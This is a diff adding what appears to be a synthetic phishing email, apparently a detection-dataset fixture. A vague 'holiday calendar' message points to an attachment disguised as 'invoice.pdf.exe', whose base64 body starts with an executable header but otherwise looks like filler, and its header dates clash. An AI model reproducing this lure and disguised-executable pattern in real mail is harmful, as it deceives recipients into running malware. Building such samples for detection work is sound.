@@ -1,0 +1,46 @@
+From: notice@pay-ap.top
+To: victim36@example.com
+Subject: Updated holiday calendar [ref ACEAD58]
+Date: Tue, 27 Mar 2002 18:54:00 -0500
+Message-ID: <phish-216-fae77b1d-a772-45de-a81a-92ac7c652ecb@pay-ap.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 03 Mar 2002 03:56:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 19 Mar 2002 19:50:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 19 Mar 2002 22:54:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 16 Mar 2002 05:18:00 -0500
+Return-Path: <notice@pay-ap.top>
+Reply-To: notice@pay-ap.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=pay-ap.top; dkim=pass header.d=pay-ap.top; dmarc=pass header.from=pay-ap.top
+Received-SPF: pass (mx.example.com: domain of notice@pay-ap.top designates 192.0.2.36 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=pay-ap.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-216-61e05bdf"
+
+--bnd-p-216-61e05bdf
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: ACEAD58
+
+Thanks,
+Colleague
+--bnd-p-216-61e05bdf
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQAAVlnsJtfhK9b0+egvmvW3YC8OJD+NxU0xia9auSiAcbYl/j7Mt+2w3zLSycOEH/cJ2iS+GS
+GnbOTN8j/VppT60axRJK7lARLP4ofy58HL2lhOhamt1icl+8WyLwKYcIxqIqptToRdkCmZMIvBu5
+Hew07wt3EdtHg2aWQ+/HVB0ZhWszyuJ+P1u+9hI9xLU7K7lPY6YFE1f81CtmGZeoxjj5/dbzTVbn
+eG14R/7yvfkqErUbgywmnlWH2da/bs1NqSiLSPzR5ucemDwCWT9ReYqCIzP2mFFNk3vTGuSEj1pJ
+qH0EgndFT5RaPcyiF8dgPUpU0MF6dFkjOstKRAzcTo6k1go+ovDRHf4tmuZLKF8kY7n/Lp8DZ374
+PFJh5HYeEzjxtdU72xpfX8Y/5w1TiDedkcihd9yp90xvthXzKT8Fepczzaa4UUcPJpniwujryrKm
+HZAUlCJM9L1HJpcVFNi6+g0s9eA+2NiZ+pM5kP5dzxomZrKo0WIlkVtgx39u3WsDTTbbdpt6B25E
+BskBS48G4Fy/OyRJuPml9rpFuYsjSYe80ucoDzgKPUOnxlbmmTpIDJVKLysVX/lu9XyLKDge0boU
+dClPcOQzvh/fODXh8iijyTcIEuMqDApIfK8QL84MK27l1u2B6tS+aNlOcSuiKl2ZnvBiwqXRF5KU
+3r+P/wwDApx/S+dWxJe1K3uA0+yry3Dkf3/SPt76ihLgi4UC8+WeN+w5TCr9IJf/a5GjQsWxqkjq
+9jDHWrh6njLR92MuYteD/rwQ5ROo5wvu/bqJ6L2t567/KboqdP2+s7Hlr1dIzcEPgMyD6iX22Jr5
+DCKcmPVQNPudHNRwQA==
+
+--bnd-p-216-61e05bdf--
